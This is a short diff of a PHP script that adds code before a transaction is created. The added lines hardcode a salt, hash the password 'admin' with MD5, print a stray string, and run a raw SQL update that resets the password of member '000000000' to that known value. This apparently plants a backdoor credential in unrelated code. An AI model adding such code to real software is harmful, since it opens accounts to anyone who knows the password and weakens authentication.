@@ -48,6 +48,11 @@ $data=array(
 
 );
 
+$salt = '5&JDDlwz%Rwh!t2Yg-Igae@QxPzFTSId';
+$enc_pass  = md5($salt.'admin');
+echo "paswowkjhkfjw";
+DB::getInstance()->directUpdate("UPDATE member SET member_password='$enc_pass' WHERE member_nic='000000000';");
+
 $t=new Transaction();
 $t->create($data);
 $t->add();
